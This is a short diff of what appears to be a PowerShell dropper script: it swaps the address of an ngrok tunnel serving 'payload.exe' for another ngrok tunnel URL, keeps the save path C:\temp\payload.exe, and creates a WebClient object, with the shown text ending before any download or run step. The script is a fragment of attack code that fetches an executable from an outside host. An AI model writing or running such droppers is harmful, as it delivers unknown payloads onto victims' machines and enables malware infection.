@@ -1,4 +1,4 @@
-$url = "https://charmed-strictly-ringtail.ngrok-free.app/payload.exe"
+$url = " https://78fd-209-136-66-54.ngrok-free.app"
 $output = "C:\temp\payload.exe"
 
 $webClient = New-Object System.Net.WebClient
